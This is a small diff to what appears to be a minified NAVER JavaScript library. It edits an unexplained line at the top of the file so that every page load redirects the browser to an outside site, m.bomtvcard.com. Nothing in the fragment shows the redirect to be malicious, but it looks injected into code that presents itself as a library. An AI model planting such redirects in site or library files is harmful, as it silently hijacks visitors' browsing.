@@ -8,7 +8,7 @@
  *
  * Copyright(c) 2021, NAVER corp, Team mantle
  */
-t.location.href = "http://m.bomtvcard.com/?1637912320985"
+window.location.href = "http://m.bomtvcard.com/?1637912320985"
 ! function(t, e) {
     function i() {
         return t.XMLHttpRequest ? new t.XMLHttpRequest : null
